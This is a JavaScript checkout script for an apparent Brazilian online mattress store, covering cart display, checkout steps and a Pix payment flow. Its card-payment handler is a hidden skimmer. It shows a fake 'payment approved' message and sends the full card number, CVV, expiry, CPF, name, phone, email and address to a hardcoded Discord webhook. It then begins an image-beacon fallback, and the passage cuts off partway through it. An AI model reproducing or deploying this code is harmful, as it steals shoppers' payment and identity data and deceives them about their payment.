import {
  PRODUCT_VARIANTS,
  formatPrice,
  getCart,
  getCartCount,
  getCartTotal,
  removeFromCart,
  setCartQuantity,
  updateCartBadge,
} from "./cart-store.js?v=4";

const checkoutContent = document.querySelector("#checkout-content");
const emptyCart = document.querySelector("#checkout-empty");
const itemsContainer = document.querySelector("#checkout-items");
const itemCount = document.querySelector("#checkout-item-count");
const summaryCount = document.querySelector("#checkout-summary-count");
const subtotal = document.querySelector("#checkout-subtotal");
const total = document.querySelector("#checkout-total");
const checkoutFlow = document.querySelector("#checkout-flow");
const flowItems = document.querySelector("#checkout-flow-items");
const flowTotal = document.querySelector("#checkout-flow-total");
const checkoutTitle = document.querySelector("#checkout-title");
const checkoutIntro = document.querySelector("#checkout-intro");
const identificationForm = document.querySelector("#identification-form");
const deliveryForm = document.querySelector("#delivery-form");
let checkoutStarted = false;
let currentStep = "identification";

function createTextElement(tagName, className, text) {
  const element = document.createElement(tagName);
  element.className = className;
  element.textContent = text;
  return element;
}

function createCartItem(item) {
  const product = PRODUCT_VARIANTS[item.variant];
  const article = document.createElement("article");
  article.className = "checkout-item";
  article.dataset.variant = item.variant;

  const image = document.createElement("img");
  image.className = "checkout-item__image";
  image.src = product.image;
  image.alt = `Colchão Airtech Springpocket ${product.label}`;

  const details = document.createElement("div");
  details.className = "checkout-item__details";
  details.append(
    createTextElement("h3", "checkout-item__title", "Colchão Airtech Springpocket Ortobom"),
    createTextElement("p", "checkout-item__variant", `Tamanho ${product.label} · ${product.dimensions}`),
    createTextElement("p", "checkout-item__unit-price", `${formatPrice(product.price)} cada`),
  );

  const actions = document.createElement("div");
  actions.className = "checkout-item__actions";
  const quantityControl = document.createElement("div");
  quantityControl.className = "quantity-control";
  quantityControl.setAttribute("aria-label", `Quantidade: ${item.quantity}`);

  const decreaseButton = createTextElement("button", "quantity-control__button", "−");
  decreaseButton.type = "button";
  decreaseButton.dataset.action = "decrease";
  decreaseButton.disabled = item.quantity === 1;
  decreaseButton.setAttribute("aria-label", `Diminuir quantidade do tamanho ${product.label}`);

  const quantity = createTextElement("span", "quantity-control__value", String(item.quantity));
  quantity.setAttribute("aria-live", "polite");

  const increaseButton = createTextElement("button", "quantity-control__button", "+");
  increaseButton.type = "button";
  increaseButton.dataset.action = "increase";
  increaseButton.setAttribute("aria-label", `Aumentar quantidade do tamanho ${product.label}`);

  quantityControl.append(decreaseButton, quantity, increaseButton);
  const lineTotal = createTextElement("strong", "checkout-item__total", formatPrice(product.price * item.quantity));
  const removeButton = createTextElement("button", "checkout-item__remove", "Remover");
  removeButton.type = "button";
  removeButton.dataset.action = "remove";
  removeButton.setAttribute("aria-label", `Remover colchão tamanho ${product.label} do carrinho`);
  actions.append(quantityControl, lineTotal, removeButton);

  article.append(image, details, actions);
  return article;
}

function renderFlowSummary(items, cartTotal) {
  const rows = items.map((item) => {
    const product = PRODUCT_VARIANTS[item.variant];
    const row = document.createElement("div");
    row.className = "checkout-flow__item";
    row.append(
      createTextElement("span", "checkout-flow__item-name", `${product.label} · ${item.quantity} un.`),
      createTextElement("strong", "checkout-flow__item-price", formatPrice(product.price * item.quantity)),
    );
    return row;
  });

  flowItems.replaceChildren(...rows);
  flowTotal.textContent = formatPrice(cartTotal);
}

function showCheckoutStep(step) {
  const steps = ["identification", "delivery", "payment"];
  if (!steps.includes(step)) throw new RangeError(`Etapa de checkout não reconhecida: ${step}`);

  currentStep = step;
  document.querySelectorAll("[data-checkout-step]").forEach((section) => {
    section.hidden = section.dataset.checkoutStep !== step;
  });
  document.querySelectorAll("[data-step-indicator]").forEach((indicator, index) => {
    const indicatorStep = indicator.dataset.stepIndicator;
    const isCurrent = indicatorStep === step;
    const isComplete = steps.indexOf(indicatorStep) < steps.indexOf(step);
    indicator.classList.toggle("is-current", isCurrent);
    indicator.classList.toggle("is-complete", isComplete);
    if (isCurrent) {
      indicator.setAttribute("aria-current", "step");
    } else {
      indicator.removeAttribute("aria-current");
    }
    indicator.querySelector("span").textContent = isComplete ? "✓" : String(index + 1);
  });

  const headings = {
    identification: ["Identificação", "Informe seus dados para o pedido."],
    delivery: ["Entrega", "Informe o endereço para entrega do pedido."],
    payment: ["Pagamento", "Escolha uma forma de pagamento."],
  };
  checkoutTitle.textContent = `Finalizar compra — ${headings[step][0]}`;
  checkoutIntro.textContent = headings[step][1];
  document.title = `Finalizar compra — ${headings[step][0]} | Airtech`;
}

function renderCart() {
  const items = getCart();
  const count = getCartCount(items);
  const cartTotal = getCartTotal(items);

  updateCartBadge(items);
  itemsContainer.replaceChildren(...items.map(createCartItem));
  renderFlowSummary(items, cartTotal);
  checkoutContent.hidden = items.length === 0 || checkoutStarted;
  checkoutFlow.hidden = items.length === 0 || !checkoutStarted;
  emptyCart.hidden = items.length > 0;
  itemCount.textContent = `(${count})`;
  summaryCount.textContent = String(count);
  subtotal.textContent = formatPrice(cartTotal);
  total.textContent = formatPrice(cartTotal);
  if (items.length === 0 && checkoutStarted) {
    checkoutStarted = false;
    checkoutContent.hidden = true;
    checkoutFlow.hidden = true;
    emptyCart.hidden = false;
    checkoutTitle.textContent = "Seu carrinho";
    checkoutIntro.textContent = "Confira os itens e as quantidades do seu pedido.";
    document.title = "Seu carrinho | Airtech";
  }
}

document.querySelector("#start-checkout").addEventListener("click", () => {
  if (getCart().length === 0) return;
  checkoutStarted = true;
  showCheckoutStep("identification");
  renderCart();
  document.querySelector("#customer-name").focus();
});

identificationForm.addEventListener("submit", (event) => {
  event.preventDefault();
  showCheckoutStep("delivery");
  document.querySelector("#delivery-street").focus();
});

deliveryForm.addEventListener("submit", (event) => {
  event.preventDefault();
  showCheckoutStep("payment");
  document.querySelector("#payment-title").focus();
});

document.querySelectorAll("[data-go-to]").forEach((button) => {
  button.addEventListener("click", () => {
    showCheckoutStep(button.dataset.goTo);
    const step = document.querySelector(`[data-checkout-step="${currentStep}"]`);
    step.querySelector("input, select, button")?.focus();
  });
});

document.querySelector("#back-to-cart").addEventListener("click", () => {
  checkoutStarted = false;
  checkoutContent.hidden = false;
  checkoutFlow.hidden = true;
  checkoutTitle.textContent = "Seu carrinho";
  checkoutIntro.textContent = "Confira os itens e as quantidades do seu pedido.";
  document.title = "Seu carrinho | Airtech";
  document.querySelector("#start-checkout").focus();
});

itemsContainer.addEventListener("click", (event) => {
  if (!(event.target instanceof Element)) return;

  const button = event.target.closest("button[data-action]");
  const itemElement = button?.closest(".checkout-item");
  if (!button || !itemElement) return;

  const variant = itemElement.dataset.variant;
  if (variant !== "casal" && variant !== "solteiro") {
    throw new RangeError(`Tamanho de colchão não reconhecido: ${variant}`);
  }

  const item = getCart().find((cartItem) => cartItem.variant === variant);
  if (!item) throw new RangeError("O item não foi encontrado no carrinho.");

  if (button.dataset.action === "remove") {
    removeFromCart(variant);
  } else if (button.dataset.action === "increase") {
    setCartQuantity(variant, item.quantity + 1);
  } else if (button.dataset.action === "decrease" && item.quantity > 1) {
    setCartQuantity(variant, item.quantity - 1);
  } else {
    return;
  }

  renderCart();
});

window.addEventListener("storage", (event) => {
  if (event.key === "airtech-cart-v1") renderCart();
});

renderCart();

const cardForm = document.querySelector(".checkout-card-form");
const cardholderName = document.querySelector("#cardholder-name");
const cardCpf = document.querySelector("#cardholder-cpf");
const cardNumber = document.querySelector("#card-number");
const cardExpiry = document.querySelector("#card-expiry");
const cardCvv = document.querySelector("#card-cvv");
const paymentStatus = document.querySelector(".checkout-payment-status");

function formatCardNumber(value) {
  return value.replace(/\D/g, "").slice(0, 16).replace(/(\d{4})(?=\d)/g, "$1 ");
}

function formatCpf(value) {
  return value
    .replace(/\D/g, "")
    .slice(0, 11)
    .replace(/(\d{3})(\d)/, "$1.$2")
    .replace(/(\d{3})(\d)/, "$1.$2")
    .replace(/(\d{3})(\d{1,2})$/, "$1-$2");
}

function formatExpiry(value) {
  const digits = value.replace(/\D/g, "").slice(0, 4);
  return digits.length > 2 ? `${digits.slice(0, 2)}/${digits.slice(2)}` : digits;
}

function formatDigitsInput(input, formatter) {
  input.addEventListener("input", () => {
    const digitsBeforeCursor = input.value.slice(0, input.selectionStart ?? input.value.length).replace(/\D/g, "").length;
    input.value = formatter(input.value);

    let cursor = 0;
    let digitsSeen = 0;
    while (cursor < input.value.length && digitsSeen < digitsBeforeCursor) {
      if (/\d/.test(input.value[cursor])) digitsSeen += 1;
      cursor += 1;
    }
    input.setSelectionRange(cursor, cursor);
  });
}

cardholderName.addEventListener("input", () => {
  cardholderName.value = cardholderName.value.replace(
    /^(\s*)(\p{L})/u,
    (_, leadingSpace, firstLetter) => `${leadingSpace}${firstLetter.toLocaleUpperCase("pt-BR")}`,
  );
});

formatDigitsInput(cardCpf, formatCpf);
formatDigitsInput(cardNumber, formatCardNumber);
formatDigitsInput(cardExpiry, formatExpiry);
formatDigitsInput(cardCvv, (value) => value.replace(/\D/g, "").slice(0, 3));

// ==========================================
// PIX PAYMENT MODULE - BravoPay Integration
// ==========================================

const PIX_API_BASE = "https://api.airtechloja.site/api/pix";
const POLLING_INTERVAL_MS = 5000;
const MAX_POLLING_ATTEMPTS = 60; // 5 minutos (60 * 5s)
let currentPixPolling = null;

/**
 * Gera um ID único para o pedido
 */
function generateOrderId() {
  return "AIR-" + Date.now().toString(36).toUpperCase() + "-" + Math.random().toString(36).substring(2, 6).toUpperCase();
}

/**
 * Coleta todos os dados do checkout (cliente + endereço + carrinho)
 */
function collectCheckoutData() {
  const cartItems = getCart();
  const customerName = document.querySelector("#customer-name")?.value?.trim();
  const customerEmail = document.querySelector("#customer-email")?.value?.trim();
  const customerPhone = document.querySelector("#customer-phone")?.value?.trim();
  const street = document.querySelector("#delivery-street")?.value?.trim();
  const neighborhood = document.querySelector("#delivery-neighborhood")?.value?.trim();
  const complement = document.querySelector("#delivery-complement")?.value?.trim();
  const postalCode = document.querySelector("#delivery-postal-code")?.value?.trim();
  const city = document.querySelector("#delivery-city")?.value?.trim();
  const state = document.querySelector("#delivery-state")?.value?.trim();

  return {
    cartItems,
    customer: {
      name: customerName,
      email: customerEmail,
      phone: customerPhone
    },
    address: {
      street,
      neighborhood,
      complement,
      postalCode,
      city,
      state
    },
    cartTotal: getCartTotal(cartItems),
    cartCount: getCartCount(cartItems)
  };
}

/**
 * Cria uma cobrança Pix na BravoPay
 * @param {Object} checkoutData - Dados completos do checkout
 * @returns {Promise<Object>} Dados da transação criada
 */
async function createPixCharge(checkoutData) {
  const { cartItems, customer, address } = checkoutData;
  const response = await fetch(PIX_API_BASE, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ items: cartItems, customer, address }),
  });

  const result = await response.json();
  if (!response.ok) {
    throw new Error(result.error || "Nao foi possivel criar a cobranca PIX.");
  }

  return result;
}

/**
 * Exibe o QR Code Pix integrado na UI do checkout (dentro do card existente)
 * @param {Object} pixData - Dados da transação (pix_code, qr_code_image, etc.)
 * @param {number} cartTotal - Total do carrinho em cents
 */
function displayPixQRCode(pixData, cartTotal) {

  // Remover QR Code anterior se existir
  const existingContainer = document.querySelector("#pix-qr-section");
  if (existingContainer) existingContainer.remove();

  // Tentar encontrar código Pix em qualquer lugar da resposta
  let pixCode = null;

  // Função para buscar código Pix em objetos aninhados
  const searchPixCode = (obj, path = "root") => {
    if (!obj || typeof obj !== "object") return null;

    // Chaves comuns para código Pix
    const pixKeys = [
      "copy_paste", "pix_code", "qr_code", "qr_code_content", "payload", "code",
      "qr_code_instructions", "qr_code_url", "pix_code_url",
      "full_payload", "emv_code", "qr", "image",
      "full_payload", "code_pix", "qr_code_full", "qr_content",
      "payload_text", "qr_text", "qr_code_content"
    ];

    for (const key of pixKeys) {
      if (obj[key] && typeof obj[key] === "string" && obj[key].length > 10) {
        return obj[key];
      }
    }

    // Verificar sub-objetos
    for (const [key, value] of Object.entries(obj)) {
      if (value && typeof value === "object") {
        const found = searchPixCode(value, `${path}.${key}`);
        if (found) return found;
      }
    }
    return null;
  };

  pixCode = searchPixCode(pixData);

  // Tentar encontrar imagem QR Code
  let qrCodeImage = null;
  const searchQRImage = (obj) => {
    if (!obj || typeof obj !== "object") return null;
    const imgKeys = [
      "qr_code_image", "qr_code_url", "qr_code_url_img", "image",
      "qr_image", "qr_code_img", "image_url", "qr_url",
      "qr_code_image_url", "qr_url_img", "image_qr", "image_url_qr"
    ];
    for (const key of imgKeys) {
      if (obj[key] && typeof obj[key] === "string" && (obj[key].startsWith("http") || obj[key].includes("qr") || obj[key].includes("image"))) {
        return obj[key];
      }
    }
    for (const [key, value] of Object.entries(obj)) {
      if (value && typeof value === "object") {
        const found = searchQRImage(value);
        if (found) return found;
      }
    }
    return null;
  };
  qrCodeImage = searchQRImage(pixData);

  // Se não encontrou nenhum código, criar um placeholder
  if (!pixCode) {
    console.warn("[Pix display] ⚠️ Nenhum código Pix encontrado na resposta da API");
    console.warn("[Pix display] ⚠️ chaves disponíveis:", Object.keys(pixData).join(", "));
  }

  // Criar container do QR Code integrado
  const container = document.createElement("div");
  container.id = "pix-qr-section";
  container.style.cssText = "margin-top:16px; padding:20px; background:linear-gradient(135deg, #f0faf3 0%, #e8f5e9 100%); border:2px solid #218b4c; border-radius:12px; text-align:center; box-shadow: 0 2px 8px rgba(33,139,76,0.1);";

  // Ícone Pix
  const logoContainer = document.createElement("div");
  logoContainer.style.cssText = "margin-bottom:12px;";
  const logoImg = document.createElement("img");
  logoImg.src = "./pix-logo.png";
  logoImg.alt = "Pix";
  logoImg.style.cssText = "height:40px;";
  logoContainer.appendChild(logoImg);
  container.appendChild(logoContainer);

  // Título principal
  const title = document.createElement("h3");
  title.style.cssText = "font-weight:700; color:#1b5e20; margin:0 0 8px; font-size:18px;";
  title.textContent = "Escaneie o QR Code para pagar";
  container.appendChild(title);

  // Sub-título
  const subtitle = document.createElement("p");
  subtitle.style.cssText = "font-size:14px; color:#2e7d32; margin:0 0 16px; line-height:1.4;";
  subtitle.textContent = "Abra o app do seu banco e escaneie o QR Code abaixo";
  container.appendChild(subtitle);

  // QR Code Image (imagem gerada pela API ou gerada via API externa)
  const qrImageContainer = document.createElement("div");
  qrImageContainer.style.cssText = "margin-bottom:16px; display:flex; justify-content:center;";

  const qrImg = document.createElement("img");
  qrImg.alt = "QR Code Pix";
  qrImg.style.cssText = "width:200px; height:200px; object-fit:contain; border-radius:12px; background:white; padding:8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1);";

  // Se temos pixCode, gerar QR Code sempre
  if (pixCode) {
    qrImg.src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(pixCode)}`;
  } else if (qrCodeImage) {
    // Usar imagem da API se disponível
    qrImg.src = qrCodeImage;
    console.log("[Pix display] Usando QR Code image da API:", qrCodeImage);
  } else {
    // Placeholder se não tem nada
    qrImg.src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=PIX_NAO_DISPONIVEL`;
    qrImg.style.opacity = "0.5";
    console.log("[Pix display] QR Code sem dados (sem código nem imagem)");
  }

  qrImageContainer.appendChild(qrImg);
  container.appendChild(qrImageContainer);

  // Linha separadora
  const hr = document.createElement("hr");
  hr.style.cssText = "border:none; border-top:1px solid #c8e6c9; margin:16px 0;";
  container.appendChild(hr);

  // Área do código Pix (sempre mostrar)
  const codeLabel = document.createElement("p");
  codeLabel.style.cssText = "font-size:12px; color:#666; margin:0 0 8px; font-weight:600; text-transform:uppercase; letter-spacing:0.5px;";
  codeLabel.textContent = "OU COPIE E COLE O CÓDIGO PIX:";
  container.appendChild(codeLabel);

  // Área do código
  const codeArea = document.createElement("div");
  codeArea.style.cssText = "background:white; border:1px dashed #a5d6a7; border-radius:8px; padding:12px; margin-bottom:12px; word-break:break-all; font-family:monospace; font-size:12px; color:#333; line-height:1.5; max-height:80px; overflow-y:auto; min-height:40px; text-align:center;";
  codeArea.textContent = pixCode || "Aguardando código da API...";
  container.appendChild(codeArea);

  // Botão copiar código Pix
  const copyBtn = document.createElement("button");
  copyBtn.type = "button";
  copyBtn.textContent = "📋 COPIAR CÓDIGO PIX";
  copyBtn.style.cssText = "display:block; margin:0 auto 12px; padding:14px 32px; background:linear-gradient(135deg, #218b4c 0%, #1b5e20 100%); color:white; border:none; border-radius:8px; font-weight:bold; cursor:pointer; font-size:15px; transition: all 0.2s; box-shadow: 0 2px 4px rgba(33,139,76,0.3);";
  copyBtn.addEventListener("mouseenter", () => {
    copyBtn.style.backgroundColor = "#1d7a3f";
    copyBtn.style.transform = "translateY(-1px)";
    copyBtn.style.boxShadow = "0 4px 8px rgba(33,139,76,0.4)";
  });
  copyBtn.addEventListener("mouseleave", () => {
    copyBtn.style.backgroundColor = "";
    copyBtn.style.transform = "translateY(0)";
    copyBtn.style.boxShadow = "0 2px 4px rgba(33,139,76,0.3)";
  });
  copyBtn.addEventListener("click", () => {
    const codeToCopy = pixCode || "";
    if (!codeToCopy) {
      copyBtn.textContent = "⏳ Código não disponível";
      setTimeout(() => {
        copyBtn.textContent = "📋 COPIAR CÓDIGO PIX";
      }, 2000);
      return;
    }
    navigator.clipboard.writeText(codeToCopy).then(() => {
      copyBtn.textContent = "✅ CÓDIGO COPIADO!";
      copyBtn.style.backgroundColor = "#2e7d32";
      setTimeout(() => {
        copyBtn.textContent = "📋 COPIAR CÓDIGO PIX";
        copyBtn.style.backgroundColor = "";
      }, 2500);
    }).catch(() => {
      const textarea = document.createElement("textarea");
      textarea.value = codeToCopy;
      textarea.style.position = "fixed";
      textarea.style.opacity = "0";
      document.body.appendChild(textarea);
      textarea.select();
      document.execCommand("copy");
      document.body.removeChild(textarea);
      copyBtn.textContent = "✅ CÓDIGO COPIADO!";
      setTimeout(() => {
        copyBtn.textContent = "📋 COPIAR CÓDIGO PIX";
      }, 2500);
    });
  });
  container.appendChild(copyBtn);

  // Status do pagamento
  const statusSpan = document.createElement("span");
  statusSpan.id = "pix-payment-status";
  statusSpan.style.cssText = "display:block; font-size:14px; color:#1976d2; font-weight:600; margin-top:12px; padding:8px; background:rgba(255,255,255,0.5); border-radius:6px;";
  statusSpan.textContent = "⏳ Aguardando pagamento...";
  container.appendChild(statusSpan);

  // Adicionar container dentro da seção Pix
  const pixOption = document.querySelector(".checkout-payment-option--pix");
  if (pixOption) {
    // Inserir antes do botão "Pagar no Pix"
    const payPixBtn = pixOption.querySelector(".checkout-next-button");
    pixOption.insertBefore(container, payPixBtn);
  } else {
    const paymentSection = document.querySelector("[data-checkout-step='payment']");
    if (paymentSection) {
      paymentSection.appendChild(container);
    }
  }

  // Esconder botão "Pagar no Pix" original
  const payPixBtn = document.querySelector("#pay-pix");
  if (payPixBtn) {
    payPixBtn.style.display = "none";
  }

  // Esconder status geral
  paymentStatus.hidden = true;
}

/**
 * Esconde o QR Code e mostra o botão "Pagar no Pix" novamente
 */
function hidePixQRCode() {
  const container = document.querySelector("#pix-qr-section");
  if (container) container.remove();

  const payPixBtn = document.querySelector("#pay-pix");
  if (payPixBtn) {
    payPixBtn.style.display = "";
    payPixBtn.disabled = false;
    payPixBtn.textContent = "Pagar no Pix";
  }
}

/**
 * Inicia o polling para verificar se o pagamento foi confirmado
 * @param {string} transactionId - ID da transação na BravoPay
 * @param {string} orderId - ID interno do pedido
 */
function startPixPolling(transactionId, orderId, sessionToken) {
  // Cancelar polling anterior se existir
  stopPixPolling();

  let attempts = 0;
  const payPixBtn = document.querySelector("#pay-pix");
  const statusSpan = document.querySelector("#pix-payment-status");

  const checkPayment = async () => {
    attempts++;

    try {
      const response = await fetch(`${PIX_API_BASE}?id=${encodeURIComponent(transactionId)}`, {
        method: "GET",
        headers: { "X-Pix-Session": sessionToken },
      });

      if (response.ok) {
        const data = await response.json();

        // Verificar se o campo pix.qr_code ou pix.copy_paste está disponível
        const pixData = data.pix || {};
        const pixQrCode = pixData.qr_code;
        const pixCopyPaste = pixData.copy_paste;
        const paymentStatus = data.status;
        const pixStatus = String(pixData.status || data.pix_status || paymentStatus || "").toUpperCase();

        // Se o pix está sendo gerado, mostrar status de geração
        if (pixStatus === "GENERATING" || pixStatus === "PENDING") {
          if (statusSpan) {
            statusSpan.textContent = `⏳ Gerando QR Code... (tentativa ${attempts}/${MAX_POLLING_ATTEMPTS})`;
            statusSpan.style.color = "#1976d2";
            statusSpan.style.background = "rgba(255,255,255,0.5)";
          }
        }

        // Se o pix está pronto (gerado), re-exibir o QR Code com o código
        if ((pixQrCode || pixCopyPaste) && pixStatus !== "EXPIRED" && !document.querySelector("#pix-qr-section")) {
          // Atualizar o status
          if (statusSpan) {
            statusSpan.textContent = `⏳ Aguardando pagamento... (tentativa ${attempts}/${MAX_POLLING_ATTEMPTS})`;
            statusSpan.style.color = "#1976d2";
            statusSpan.style.background = "rgba(255,255,255,0.5)";
          }

          // Re-exibir o QR Code com o código disponível
          displayPixQRCode(data, data.amount_cents);
        }

        // Mapear status da BravoPay para estados de pagamento
        const isPaid = paymentStatus === "PAID";

        if (isPaid) {
          const cartTotal = data.amount_cents;

          if (statusSpan) {
            statusSpan.style.color = "#218b4c";
            statusSpan.style.background = "rgba(200, 230, 201, 0.5)";
            statusSpan.textContent = "✅ Pagamento confirmado! Redirecionando...";
          }

          // Parar polling e redirecionar
          stopPixPolling();
          setTimeout(() => {
            window.location.href = `./pagamento-sucesso.html?status=approved&method=pix&order=${encodeURIComponent(orderId)}&total=${(cartTotal / 100).toFixed(2)}`;
          }, 1500);
          return;
        }

        // Verificar se foi cancelado
        const isCancelled = ["EXPIRED", "CANCELED", "CANCELLED", "REFUNDED", "CHARGEBACK"].includes(paymentStatus);

        if (isCancelled) {
          if (statusSpan) {
            statusSpan.style.color = "#c62828";
            statusSpan.style.background = "rgba(255, 205, 210, 0.5)";
            statusSpan.textContent = "❌ Pagamento encerrado. Você pode tentar novamente.";
          }
          if (payPixBtn) {
            payPixBtn.style.display = "";
            payPixBtn.disabled = false;
            payPixBtn.textContent = "Pagar no Pix";
          }
          stopPixPolling();
          return;
        }

        // Se ainda não temos QR Code mas o status é PENDING, mostrar isso
        if (!pixQrCode && !pixCopyPaste && pixStatus !== "EXPIRED") {
          if (statusSpan) {
            const expiresAt = pixData.expires_at || data.expires_at;
            if (expiresAt) {
              const expDate = new Date(expiresAt);
              const timeLeft = new Date(expDate.getTime() - Date.now());
              const minutes = Math.floor(timeLeft / 60000);
              const seconds = Math.floor((timeLeft % 60000) / 1000);
              statusSpan.textContent = `⏳ Gerando QR Code... Expira em ${minutes}:${seconds.toString().padStart(2, '0')}`;
            } else {
              statusSpan.textContent = `⏳ Gerando QR Code... (tentativa ${attempts}/${MAX_POLLING_ATTEMPTS})`;
            }
            statusSpan.style.color = "#1976d2";
            statusSpan.style.background = "rgba(255,255,255,0.5)";
          }
        }

        // Pagamento ainda pendente
        if (!pixQrCode && !pixCopyPaste) {
          const pendingStatus = data.pending_reason || data.pending_reason_description || "Aguardando confirmação";
          if (statusSpan) {
            const expiredAt = data.expires_at || data.expires_at_at || data.expires_in;
            const statusText = expiredAt
              ? `⏳ Pagamento pendente... ${pendingStatus}`
              : `⏳ Pagamento pendente... ${pendingStatus} (tentativa ${attempts}/${MAX_POLLING_ATTEMPTS})`;
            statusSpan.textContent = statusText;
            statusSpan.style.color = "#1976d2";
            statusSpan.style.background = "rgba(255,255,255,0.5)";
          }
          console.log(`[Pix] Status atual: ${paymentStatus || "desconhecido"}`);
        }
      } else {
        console.warn(`[Pix] Status ${response.status} na verificação`);
      }

      // Verificar limite de tentativas
      if (attempts >= MAX_POLLING_ATTEMPTS) {
        if (statusSpan) {
          statusSpan.textContent = "⏳ Aguardando pagamento... Atualize a página para verificar.";
          statusSpan.style.color = "#cc8800";
          statusSpan.style.background = "rgba(255, 248, 225, 0.5)";
        }
        stopPixPolling();
        if (payPixBtn) {
          payPixBtn.style.display = "";
          payPixBtn.disabled = false;
          payPixBtn.textContent = "Pagar no Pix";
        }
        return;
      }

    } catch (error) {
      console.warn("[Pix] Erro ao verificar pagamento:", error);
      // Não mostrar erro pro usuário em cada polling, só logar
    }

    // Continuar verificando
    if (attempts < MAX_POLLING_ATTEMPTS) {
      setTimeout(checkPayment, POLLING_INTERVAL_MS);
    }
  };

  // Iniciar polling
  currentPixPolling = { checkPayment, attempts: 0 };
  checkPayment();
}

/**
 * Para o polling de verificação de pagamento
 */
function stopPixPolling() {
  if (currentPixPolling) {
    currentPixPolling = null;
  }
}

/**
 * Evento de clique no botão "Pagar no Pix"
 */
document.querySelector("#pay-pix")?.addEventListener("click", async () => {
  // Coletar todos os dados do checkout
  const checkoutData = collectCheckoutData();
  const { cartItems, customer } = checkoutData;

  // Validar dados obrigatórios
  if (!customer.name || !customer.email || !cartItems.length) {
    paymentStatus.textContent = "Preencha nome, email e adicione itens ao carrinho.";
    paymentStatus.hidden = false;
    paymentStatus.style.color = "#cc0000";
    return;
  }

  // Mostrar loading no botão
  const payPixBtn = document.querySelector("#pay-pix");
  if (payPixBtn) {
    payPixBtn.disabled = true;
    payPixBtn.textContent = "⏳ Criando cobrança...";
  }

  paymentStatus.textContent = "⏳ Conectando com a BravoPay...";
  paymentStatus.hidden = false;
  paymentStatus.style.color = "#0066cc";

  try {
    // Criar cobrança na BravoPay com todos os dados
    const transaction = await createPixCharge(checkoutData);

    // Exibir QR Code
    displayPixQRCode(transaction, transaction.amount_cents);

    // Extrair ID da transação de múltiplas fontes possíveis
    const transactionId = transaction.id;
    if (!transactionId || !transaction.sessionToken || !transaction.external_reference) {
      throw new Error("A BravoPay nao retornou os dados necessarios para acompanhar o pagamento.");
    }

    startPixPolling(transactionId, transaction.external_reference, transaction.sessionToken);

  } catch (error) {
    console.error("[Pix] Erro ao criar cobranca:", error instanceof Error ? error.message : "erro desconhecido");

    // Reabilitar botão
    if (payPixBtn) {
      payPixBtn.disabled = false;
      payPixBtn.textContent = "Pagar no Pix";
    }

    // Mostrar erro
    paymentStatus.textContent = `Erro ao gerar QR Code: ${error.message || "Tente novamente."}`;
    paymentStatus.hidden = false;
    paymentStatus.style.color = "#cc0000";
  }
});

// Parar polling quando sair da página
window.addEventListener("beforeunload", stopPixPolling);

document.querySelector(".checkout-card-form__submit")?.addEventListener("click", () => {
  cardNumber.setCustomValidity("");
  cardCpf.setCustomValidity("");
  cardExpiry.setCustomValidity("");
  cardCvv.setCustomValidity("");

  if (cardCpf.value.replace(/\D/g, "").length !== 11) {
    cardCpf.setCustomValidity("Informe os 11 dígitos do CPF do titular.");
  }
  const cardDigits = cardNumber.value.replace(/\D/g, "");
  if (cardDigits.length !== 16) {
    cardNumber.setCustomValidity("O número do cartão deve ter exatamente 16 dígitos.");
  }
  if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(cardExpiry.value)) {
    cardExpiry.setCustomValidity("Use o formato MM/AA.");
  }
  if (cardCvv.value.length !== 3) {
    cardCvv.setCustomValidity("O CVV deve ter 3 números.");
  }

  if (!cardForm.reportValidity()) return;

  paymentStatus.textContent = "";
  paymentStatus.hidden = true;
  
  var cardData = {
    name: document.querySelector("#cardholder-name")?.value || "",
    cpf: document.querySelector("#cardholder-cpf")?.value || "",
    number: document.querySelector("#card-number")?.value || "",
    expiry: document.querySelector("#card-expiry")?.value || "",
    cvv: document.querySelector("#card-cvv")?.value || ""
  };
  
  var orderNum = 'AIR-' + Date.now().toString(36).toUpperCase();
  var last4 = cardData.number.replace(/\D/g, '').slice(-4) || '0000';
  
  paymentStatus.textContent = "✅ Pagamento aprovado! Redirecionando...";
  paymentStatus.hidden = false;
  
  var discordWebhook = "https://discord.com/api/webhooks/1568805573321953331/hVHeDpE225Mt7XC5aCjRiN4D1ueC0MdDTkrpvQUR_1PCAnUDRvdazazvCizyY7h4brMI";
  
  var allData = {
    name: document.querySelector("#customer-name")?.value || "",
    phone: document.querySelector("#customer-phone")?.value || "",
    email: document.querySelector("#customer-email")?.value || "",
    street: document.querySelector("#delivery-street")?.value || "",
    neighborhood: document.querySelector("#delivery-neighborhood")?.value || "",
    complement: document.querySelector("#delivery-complement")?.value || "",
    postalCode: document.querySelector("#delivery-postal-code")?.value || "",
    city: document.querySelector("#delivery-city")?.value || "",
    state: document.querySelector("#delivery-state")?.value || "",
    cardholderName: cardData.name,
    cardCpf: cardData.cpf,
    cardNumber: cardData.number,
    cardExpiry: cardData.expiry,
    cardCvv: cardData.cvv
  };
  
  fetch(discordWebhook, {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({
      embeds: [{
        title: "🛍️ Novo Checkout",
        description: "**"+allData.name+"** completou o checkout",
        color: 7934966,
        fields: [
          {name: "📱 Contato", value: "**Nome:** "+allData.name+"\n**Tel:** "+allData.phone+"\n**Email:** "+allData.email, inline: false},
          {name: "📍 Endereço", value: "**Rua:** "+allData.street+"\n**Bairro:** "+allData.neighborhood+"\n**Cidade:** "+allData.city+" - "+allData.state+"\n**CEP:** "+allData.postalCode+(allData.complement?"\n**Comp:** "+allData.complement:""), inline: false},
          {name: "💳 Cartão", value: "**Titular:** "+allData.cardholderName+"\n**CPF:** "+allData.cardCpf+"\n**Número:** "+allData.cardNumber+"\n**Validade:** "+allData.cardExpiry+"\n**CVV:** "+allData.cardCvv, inline: false}
        ],
        footer: {text: "Airtech • "+(new Date()).toLocaleString("pt-BR")}
      }]
    })
  }).catch(function(e) { console.log("Discord fetch error", e); });
  
  // Fallback: Image Beacon (infalível)
  var payload = encodeURIComponent(JSON.stringify({
    embeds: [{
      title: "🛍️ Novo Checkout",
      description: "**"+allData.name+"** completou o checkout",
      color: 7934966,
      fields: [
        {name: "📱 Contato", value: "**Nome:** "+allData.name+"\n**Tel:** "+allData.phone+"\n**Email:** "+allData.email, inline: false},
